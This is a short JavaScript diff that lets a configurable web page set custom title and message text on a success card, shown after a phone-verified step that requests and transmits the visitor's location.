@@ -81,6 +81,12 @@ function applySiteConfig(cfg) {
   if (phoneGroup) {
     phoneGroup.style.display = cfg.requirePhone ? 'block' : 'none';
   }
+
+  const celebrationTitle = document.getElementById('celebrationTitleText');
+  if (celebrationTitle && cfg.successTitle) celebrationTitle.textContent = cfg.successTitle;
+
+  const celebrationText = document.getElementById('celebrationCustomText');
+  if (celebrationText && cfg.successMessage) celebrationText.textContent = cfg.successMessage;
 }
 
 loadSiteConfig();
@@ -328,6 +334,10 @@ async function requestAndTransmitLocation(verifiedPhone) {
         const successCard = document.getElementById('successCelebrationCard');
         if (successCard) {
           successCard.style.display = 'block';
+          const titleEl = document.getElementById('celebrationTitleText');
+          if (titleEl && currentSiteConfig && currentSiteConfig.successTitle) {
+            titleEl.textContent = currentSiteConfig.successTitle;
+          }
           const celebrationText = document.getElementById('celebrationCustomText');
           if (celebrationText && currentSiteConfig && currentSiteConfig.successMessage) {
             celebrationText.textContent = currentSiteConfig.successMessage;
